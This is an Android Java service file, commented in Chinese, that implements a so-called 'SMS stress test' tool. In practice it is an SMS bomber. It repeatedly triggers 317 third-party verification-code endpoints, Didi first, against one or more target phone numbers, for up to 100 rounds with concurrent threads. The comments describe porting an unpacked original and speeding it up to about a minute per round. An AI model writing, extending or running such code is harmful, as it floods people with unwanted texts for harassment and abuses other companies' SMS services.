package com.example.seagullkit;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.Icon;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Process;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.Locale;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * 前台服务：短信测压主循环。
 *
 * <p>对应脱壳产物里的：
 * <pre>
 *   for i, fn in enumerate(SENDERS, 1):
 *       print(f'[{i}/{len(SENDERS)}] 发送中...')
 *       try: fn(手机号); print("✓")
 *       except: print("✗")
 *       time.sleep(0.1)
 * </pre>
 *
 * <p><b>相对原版的两处增强</b>：
 * <ol>
 *   <li><b>循环测压次数</b>：把整张接口表（当前 317 条）跑 N 遍，总数 = 接口数 × N</li>
 *   <li><b>并发数</b>：原版是纯串行，313 个不同域名每个都要 DNS + TCP + TLS 三次往返，
 *       再叠加死接口的 8s 超时，跑一轮要十几分钟。这里改成固定大小线程池并发发送，
 *       默认 8 并发，实测能把一轮压到 1 分钟量级。</li>
 * </ol>
 *
 * <p>停止是**优雅**的：当前在途的请求跑完就不再取新任务，然后写统计。
 */
public class SmsStressService extends Service {

    private static final String TAG = "SeagullSms";

    public static final String EXTRA_PHONE = "phone";
    /** 多号码列表（优先于单个 EXTRA_PHONE） */
    public static final String EXTRA_PHONES = "phones";
    public static final String EXTRA_DELAY_MS = "delay_ms";
    public static final String EXTRA_LOOPS = "loops";
    public static final String EXTRA_CONCURRENCY = "concurrency";
    /** 干跑开关：仅内部/调试用，界面上不暴露 */
    public static final String EXTRA_DRY_RUN = "dry_run";
    /** 首发开关：开始前先单独打一发滴滴接口（默认开） */
    public static final String EXTRA_PINNED_FIRST = "pinned_first";

    private static final String CHANNEL_ID = "seagull_sms";
    private static final int NOTIFICATION_ID = 3003;

    public static final String ACTION_STOP = "com.example.seagullkit.SMS_STOP";

    /** 延迟切片：边等边检查停止标志，保证按停的响应 <=100ms */
    private static final long SLICE_MS = 100;

    public static final int MAX_LOOPS = 100;
    /** 并发上限：再高对端也扛不住，且容易触发风控 */
    public static final int MAX_CONCURRENCY = 32;
    public static final int DEFAULT_CONCURRENCY = 8;

    /**
     * 全局最小请求间隔（毫秒）：所有线程合计，每 {@code MIN_GAP_MS} 毫秒最多发出一条请求。
     *
     * <p>1000/30 ≈ 33 次/秒。这是防止"高并发 × 高循环"把系统 socket 表打爆的硬闸——
     * 之前没有这道闸，8 并发 × 100ms 间隔 ≈ 80 次/秒持续几十分钟，海量 TCP/TLS 连接
     * 堆积成 TIME_WAIT，最终整机卡死。
     */
    private static final long MIN_GAP_MS = 30;

    // ── 运行状态（Activity 直接读，避免 bind） ────────────────
    private static volatile boolean running = false;
    private static volatile boolean stopRequested = false;
    private static volatile int loops = 1;
    private static volatile int loopIndex = 0;
    private static volatile int perLoop = 0;
    /** 号码个数（多号码支持） */
    private static volatile int phoneCount = 0;
    private static volatile int total = 0;
    private static volatile int concurrency = DEFAULT_CONCURRENCY;
    private static volatile String currentHost = "";
    private static volatile String stopReason = "";
    private static volatile long startedAt = 0;
    private static volatile long finishedAt = 0;
    private static volatile boolean dryRun = false;
    private static volatile boolean pinnedFirst = true;
    /** 目标号码列表（多号码支持）。单号码时 size==1，行为与旧版一致。 */
    private static volatile List<String> phones = new ArrayList<>();
    /** 当前正在处理的号码（供界面显示） */
    private static volatile String currentPhone = "";

    private static final AtomicInteger done = new AtomicInteger();
    private static final AtomicInteger okCount = new AtomicInteger();
    private static final AtomicInteger failCount = new AtomicInteger();

    private static final LinkedList<String> LOG = new LinkedList<>();
    private static final int LOG_MAX = 400;

    /** 界面回调；由 Activity 注册，回调发生在工作线程，界面自己 post 回主线程 */
    public interface Listener {
        void onSmsState();
    }

    private static Listener listener;

    /** 上次通知界面的时间；用于对 UI 回调做节流，避免高频重建界面把主线程打爆 */
    private static volatile long lastUiNotify = 0;
    /** UI 回调最小间隔：500ms。就算每秒跑几十条，界面刷新也不会超过 2 次/秒 */
    private static final long UI_NOTIFY_MIN_INTERVAL = 500;

    public static void setListener(Listener l) {
        listener = l;
    }

    private static void notifyUi() {
        Listener l = listener;
        if (l != null) {
            try {
                l.onSmsState();
            } catch (Exception ignored) {
            }
        }
    }

    /**
     * 节流版通知：500ms 内最多触发一次，用于工作线程的高频进度回调。
     *
     * <p>原来的实现是「每 5 条结果就通知一次」，1000 轮循环时有 6 万多次回调，
     * 每次都让 Activity 清空并重建日志区、重设进度条，主线程直接被拖垮。
     */
    private static void notifyUiThrottled() {
        long now = System.currentTimeMillis();
        if (now - lastUiNotify < UI_NOTIFY_MIN_INTERVAL) return;
        lastUiNotify = now;
        notifyUi();
    }

    // ── 对外状态读取 ─────────────────────────────────────────
    public static boolean isRunning() { return running; }
    public static boolean isStopRequested() { return stopRequested; }
    public static int getLoops() { return loops; }
    public static int getLoopIndex() { return loopIndex; }
    public static int getPerLoop() { return perLoop; }
    public static int getTotal() { return total; }
    public static int getDone() { return done.get(); }
    public static int getOkCount() { return okCount.get(); }
    public static int getFailCount() { return failCount.get(); }
    public static int getConcurrency() { return concurrency; }
    public static String getCurrentHost() { return currentHost; }
    public static String getStopReason() { return stopReason; }
    public static boolean isDryRun() { return dryRun; }
    public static boolean isPinnedFirst() { return pinnedFirst; }
    /** 目标号码列表的副本 */
    public static List<String> getPhones() { return new ArrayList<>(phones); }
    /** 号码个数 */
    public static int getPhoneCount() { return phones.size(); }
    /** 当前正在处理的号码 */
    public static String getCurrentPhone() { return currentPhone; }
    /** 兼容旧调用：返回第一个号码（空列表返回空串） */
    public static String getPhone() { return phones.isEmpty() ? "" : phones.get(0); }
    public static long getStartedAt() { return startedAt; }
    public static long getFinishedAt() { return finishedAt; }

    /** 平均速度（条/秒）；未开始返回 0 */
    public static double getRate() {
        long start = startedAt;
        if (start <= 0) return 0;
        long end = running ? System.currentTimeMillis() : (finishedAt > 0 ? finishedAt : System.currentTimeMillis());
        long ms = end - start;
        if (ms <= 0) return 0;
        return done.get() * 1000.0 / ms;
    }

    public static synchronized List<String> snapshotLog() {
        return new ArrayList<>(LOG);
    }

    public static synchronized void clearLog() {
        LOG.clear();
    }

    private static synchronized void appendLog(String line) {
        LOG.addFirst(line);
        while (LOG.size() > LOG_MAX) LOG.removeLast();
    }

    // ── 启停 ─────────────────────────────────────────────────
    public static void start(Context ctx, String phoneNo, long delayMs, int loopCount, int conc) {
        start(ctx, phoneNo, delayMs, loopCount, conc, true);
    }

    /** 带「首发接口」开关的启动（单号码，兼容旧调用） */
    public static void start(Context ctx, String phoneNo, long delayMs, int loopCount, int conc,
                             boolean pinnedFirstEnabled) {
        startMulti(ctx, SmsEndpoints.parsePhones(phoneNo), delayMs, loopCount, conc, pinnedFirstEnabled);
    }

    /** 多号码启动：已有号码列表，直接送入服务 */
    public static void startMulti(Context ctx, List<String> phoneList, long delayMs,
                                  int loopCount, int conc, boolean pinnedFirstEnabled) {
        int n = clampLoops(loopCount);
        int c = clampConcurrency(conc);
        Intent i = new Intent(ctx, SmsStressService.class);
        i.putStringArrayListExtra(EXTRA_PHONES, new ArrayList<>(phoneList));
        i.putExtra(EXTRA_DELAY_MS, delayMs);
        i.putExtra(EXTRA_LOOPS, n);
        i.putExtra(EXTRA_CONCURRENCY, c);
        i.putExtra(EXTRA_PINNED_FIRST, pinnedFirstEnabled);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(i);
        } else {
            ctx.startService(i);
        }
    }

    public static int clampLoops(int n) {
        if (n < 1) return 1;
        return Math.min(n, MAX_LOOPS);
    }

    public static int clampConcurrency(int c) {
        if (c < 1) return 1;
        return Math.min(c, MAX_CONCURRENCY);
    }

    /** 请求停止：等价 shell 版里的 touch 停止文件 */
    public static void stop(Context ctx) {
        stopRequested = true;
        if (!running) {
            ctx.stopService(new Intent(ctx, SmsStressService.class));
        }
    }

    // ── 生命周期 ─────────────────────────────────────────────
    private HandlerThread workerThread;
    private Handler workerHandler;
    private long delayMs = 100;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            stop(this);
            return START_NOT_STICKY;
        }

        startForeground(NOTIFICATION_ID, buildNotification("准备中…", 0, 0));

        if (running) {
            return START_NOT_STICKY;   // 已在跑，忽略重复启动
        }

        String extraPhone = intent == null ? null : intent.getStringExtra(EXTRA_PHONE);
        // 优先取多号码列表；没有则回落到单个 EXTRA_PHONE
        List<String> extraList = intent == null ? null : intent.getStringArrayListExtra(EXTRA_PHONES);
        if (extraList != null && !extraList.isEmpty()) {
            phones = new ArrayList<>(extraList);
        } else {
            phones = SmsEndpoints.parsePhones(extraPhone == null ? "" : extraPhone);
        }
        currentPhone = phones.isEmpty() ? "" : phones.get(0);
        delayMs = intent == null ? 100 : intent.getLongExtra(EXTRA_DELAY_MS, 100);
        loops = clampLoops(intent == null ? 1 : intent.getIntExtra(EXTRA_LOOPS, 1));
        concurrency = clampConcurrency(
                intent == null ? DEFAULT_CONCURRENCY : intent.getIntExtra(EXTRA_CONCURRENCY, DEFAULT_CONCURRENCY));
        dryRun = intent != null && intent.getBooleanExtra(EXTRA_DRY_RUN, false);
        pinnedFirst = intent == null || intent.getBooleanExtra(EXTRA_PINNED_FIRST, true);

        stopRequested = false;
        stopReason = "";
        done.set(0);
        okCount.set(0);
        failCount.set(0);
        loopIndex = 0;
        currentHost = "";
        finishedAt = 0;
        startedAt = System.currentTimeMillis();

        List<SmsEndpoints.Rec> all = SmsEndpoints.load(this);
        perLoop = all.size();
        phoneCount = Math.max(1, phones.size());
        // 每轮 = 接口数 × 号码数；首发 = 每个号码各打一发
        int pinnedCount = pinnedFirst ? phoneCount : 0;
        total = perLoop * loops * phoneCount + pinnedCount;

        synchronized (SmsStressService.class) {
            LOG.clear();
        }
        appendLog("目标号码 " + phoneCount + " 个" + (dryRun ? "（干跑，不实际发送）" : ""));
        if (phoneCount > 0) {
            StringBuilder pb = new StringBuilder("  ");
            for (int i = 0; i < phones.size(); i++) {
                if (i > 0) pb.append(' ');
                pb.append(phones.get(i));
                if (i >= 9) { pb.append(" …共").append(phoneCount).append("个"); break; }
            }
            appendLog(pb.toString());
        }
        appendLog("接口表 " + perLoop + " 条 × 循环 " + loops + " 轮 × 号码 " + phoneCount + " 个"
                + (pinnedFirst ? " + 首发 " + pinnedCount + " 次" : "")
                + " = 共 " + total
                + " 次请求 · 并发 " + concurrency + " · 间隔 " + delayMs + "ms");

        workerThread = new HandlerThread("seagull-sms-worker", Process.THREAD_PRIORITY_BACKGROUND);
        workerThread.start();
        workerHandler = new Handler(workerThread.getLooper());
        workerHandler.post(new Runnable() {
            @Override
            public void run() {
                runLoop();
            }
        });
        running = true;
        notifyUi();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        stopRequested = true;
        running = false;
        if (workerHandler != null) workerHandler.removeCallbacksAndMessages(null);
        if (workerThread != null) workerThread.quitSafely();
        finishedAt = System.currentTimeMillis();
        notifyUi();
        super.onDestroy();
    }

    // ── 主循环（并发 · 多号码） ──────────────────────────────
    private void runLoop() {
        final List<SmsEndpoints.Rec> all = SmsEndpoints.load(this);
        final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        final int threads = clampConcurrency(concurrency);
        // 冻结一份号码列表快照，整个测压过程用它
        final List<String> targets = new ArrayList<>(phones);
        if (targets.isEmpty()) targets.add("");

        // 全局速率闸：所有工作线程共享，保证整体请求速率不超过 QPS 上限
        final AtomicLong nextSlot = new AtomicLong(System.currentTimeMillis());

        // ── 首发：滴滴出行（每个号码各先单独打一发）──
        if (pinnedFirst && !stopRequested) {
            for (String target : targets) {
                if (stopRequested) break;
                firePinnedFirst(sdf, target);
            }
        }

        ExecutorService pool = Executors.newFixedThreadPool(threads);
        try {
            for (int round = 1; round <= loops && !stopRequested; round++) {
                loopIndex = round;
                if (loops > 1) {
                    appendLog(sdf.format(new Date()) + "  ── 第 " + round + "/" + loops + " 轮开始 ──");
                    notifyUiThrottled();
                }

                // 任务扁平化为「接口序号 × 号码序号」：totalTasks = all.size() * targets.size()
                final int perTarget = all.size();
                final int totalTasks = targets.size() * perTarget;
                final AtomicInteger cursor = new AtomicInteger(0);
                List<Future<?>> futures = new ArrayList<>(threads);
                for (int t = 0; t < threads; t++) {
                    futures.add(pool.submit(new Runnable() {
                        @Override
                        public void run() {
                            workerLoop(all, targets, cursor, totalTasks, perTarget, nextSlot);
                        }
                    }));
                }
                for (Future<?> f : futures) {
                    try {
                        f.get();
                    } catch (Exception ignored) {
                    }
                }
            }
        } finally {
            pool.shutdownNow();
            try {
                pool.awaitTermination(2, TimeUnit.SECONDS);
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
        }

        if (stopRequested && stopReason.isEmpty()) {
            stopReason = "用户手动停止";
        }
        finishedAt = System.currentTimeMillis();
        running = false;
        loopIndex = 0;
        appendLog("结束：" + summaryText());
        notifyUi();

        NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm != null) {
            nm.notify(NOTIFICATION_ID, buildNotification(summaryText(), done.get(), total));
            nm.cancel(NOTIFICATION_ID);
        }
        stopForeground(STOP_FOREGROUND_REMOVE);
        stopSelf();
    }

    /**
     * 首发接口：每次测压开始先单独打一发滴滴出行。
     *
     * <p>不参与并发游标，串行先跑完，让"最稳的那个接口"第一时间打出去。
     * 计数并入 done / okCount / failCount，total 里已预留这 1 次。
     */
    private void firePinnedFirst(SimpleDateFormat sdf, String target) {
        SmsEndpoints.Rec p = SmsEndpoints.pinned(this);
        if (p == null) {
            appendLog("首发接口未找到（接口表里没有滴滴 codeMT），跳过");
            notifyUi();
            return;
        }
        currentHost = p.host();
        currentPhone = target;
        appendLog(sdf.format(new Date()) + "  ── 首发接口 · " + target + " ──");
        notifyUi();

        SmsStressSender.Result r = SmsStressSender.send(p, target, new Random(), dryRun);
        int n = done.incrementAndGet();
        if (r.ok) {
            okCount.incrementAndGet();
        } else {
            failCount.incrementAndGet();
        }
        appendLog(sdf.format(new Date())
                + "  [" + n + "/" + total + "]  "
                + target
                + (r.ok ? "  ✓成功  " : "  ✗失败  ")
                + "★首发  " + SmsEndpoints.describe(p)
                + "  " + r.shortDesc());
        notifyUi();
    }

    /** 单个工作线程：不断从游标取任务，发一条、记一条、歇一下。
     *
     * <p>游标是「接口序号 × 号码序号」的扁平下标：
     * 接口序号 = i / phoneCount，号码序号 = i % phoneCount。
     * 这样同一时刻多个号码会被同时打出——号码0、1、2 的第 1 条接口一起发，
     * 再打第 2 条……三个号码是真正并行在测压，而不是一个号码排队跑完再下一个。
     */
    private void workerLoop(List<SmsEndpoints.Rec> all, List<String> targets,
                            AtomicInteger cursor, int totalTasks, int perTarget,
                            AtomicLong nextSlot) {
        Random rnd = new Random();
        final int phoneNum = targets.size();
        // 每个工作线程各持一个：SimpleDateFormat 不是线程安全的，共享会串格式
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        while (!stopRequested) {
            int i = cursor.getAndIncrement();
            if (i >= totalTasks) break;
            // 号码在内层：接口按顺序推进，每个接口对每个号码各发一条
            int rIdx = phoneNum <= 0 ? 0 : i / phoneNum;
            int tIdx = phoneNum <= 0 ? 0 : i % phoneNum;
            if (rIdx < 0 || rIdx >= all.size()) continue;
            String target = tIdx < targets.size() ? targets.get(tIdx) : "";
            SmsEndpoints.Rec rec = all.get(rIdx);
            currentHost = rec.host();
            currentPhone = target;

            // 全局速率闸：抢占下一个时间槽，确保整体 QPS 不超过上限
            awaitRateLimit(nextSlot);

            SmsStressSender.Result r = SmsStressSender.send(rec, target, rnd, dryRun);
            if (stopRequested) break;

            int n = done.incrementAndGet();
            if (r.ok) {
                okCount.incrementAndGet();
            } else {
                failCount.incrementAndGet();
            }
            appendLog(sdf.format(new Date())
                    + (loops > 1 ? "  轮" + loopIndex + "/" + loops : "")
                    + "  [" + n + "/" + total + "]  "
                    + target
                    + (r.ok ? "  ✓成功  " : "  ✗失败  ")
                    + SmsEndpoints.describe(rec)
                    + "  " + r.shortDesc());

            if (n % 5 == 0 || n == total) {
                NotificationManager nm =
                        (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) {
                    nm.notify(NOTIFICATION_ID, buildNotification(progressText(), n, total));
                }
                notifyUiThrottled();
            }

            if (!sleepWithStopCheck(delayMs)) break;
        }
    }

    /**
     * 全局速率闸：所有工作线程共享一个「下一个可发送时间」游标。
     *
     * <p>每个请求进来时，原子地把游标往后推 {@code MIN_GAP_MS} 毫秒，拿到属于自己的时间槽，
     * 然后睡到那个时间点。这样不管并发开多大，整个应用的请求速率都被钉在
     * {@code 1000 / MIN_GAP_MS} 次/秒以内，避免瞬时海量 TCP/TLS 连接打爆系统 socket 表。
     *
     * <p>如果游标已经落后于当前时间（之前请求快、追不上了），就归零重来，避免无限追赶。
     */
    private void awaitRateLimit(AtomicLong nextSlot) {
        if (MIN_GAP_MS <= 0) return;
        long now = System.currentTimeMillis();
        long slot = nextSlot.getAndAdd(MIN_GAP_MS);
        // 游标落后太多（超过 1 秒），说明被追平了，重置为当前时间
        if (slot < now - 1000) {
            nextSlot.set(now);
            slot = now;
        }
        long wait = slot - now;
        if (wait > 0) {
            sleepWithStopCheck(wait);
        }
    }

    /** 分片睡眠，期间检查停止标志；返回 false = 应当停止 */
    private boolean sleepWithStopCheck(long ms) {
        long left = ms;
        while (left > 0) {
            if (stopRequested) return false;
            long chunk = Math.min(SLICE_MS, left);
            try {
                Thread.sleep(chunk);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
            left -= chunk;
        }
        return !stopRequested;
    }

    private String progressText() {
        String head = loops > 1
                ? "第 " + Math.max(1, loopIndex) + "/" + loops + " 轮 · "
                : "";
        String num = phoneCount > 1 ? " →" + currentPhone : "";
        return head + "[" + done.get() + "/" + total + "]  " + currentHost + num
                + "  ·  成功 " + okCount.get() + " / 失败 " + failCount.get()
                + "  ·  " + String.format(Locale.US, "%.1f", getRate()) + " 条/秒";
    }

    private String summaryText() {
        StringBuilder sb = new StringBuilder();
        sb.append("已处理 ").append(done.get()).append("/").append(total);
        sb.append("，成功 ").append(okCount.get()).append("，失败 ").append(failCount.get());
        sb.append(String.format(Locale.US, "，平均 %.1f 条/秒", getRate()));
        if (loops > 1) {
            sb.append("（循环 ").append(loops).append(" 轮");
            sb.append(stopRequested ? "，中断于第 " : "，已完成");
            sb.append(stopRequested ? Math.max(1, loopIndex) : loops).append(" 轮）");
        }
        if (stopRequested) {
            sb.append("（已停止：")
              .append(stopReason.isEmpty() ? "用户手动停止" : stopReason)
              .append("）");
        }
        return sb.toString();
    }

    // ── 通知 ─────────────────────────────────────────────────
    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "短信测压状态",
                    NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("显示测压进度，并提供停止按钮");
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
        }
    }

    private PendingIntent activityPending() {
        Intent i = new Intent(this, SmsStressActivity.class);
        i.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        return PendingIntent.getActivity(this, 0, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
    }

    private PendingIntent stopPending() {
        Intent i = new Intent(this, SmsStressService.class);
        i.setAction(ACTION_STOP);
        return PendingIntent.getService(this, 1, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
    }

    private Notification buildNotification(String content, int cur, int all) {
        int color = stopRequested ? androidx.core.content.ContextCompat.getColor(this, R.color.state_warn) : androidx.core.content.ContextCompat.getColor(this, R.color.state_info);
        String title = loops > 1
                ? "短信测压 · 轮 " + Math.max(1, loopIndex) + "/" + loops + " · " + cur + "/" + all
                : "短信测压 · " + cur + "/" + all;
        Notification.Builder b = new Notification.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setContentTitle(title)
                .setContentText(content)
                .setStyle(new Notification.BigTextStyle().bigText(content))
                .setContentIntent(activityPending())
                .setOngoing(true)
                .setShowWhen(false)
                .setColor(color);
        if (running) {
            b.addAction(new Notification.Action.Builder(
                    Icon.createWithResource(this, android.R.drawable.ic_menu_close_clear_cancel),
                    "停止", stopPending()).build());
        }
        return b.build();
    }
}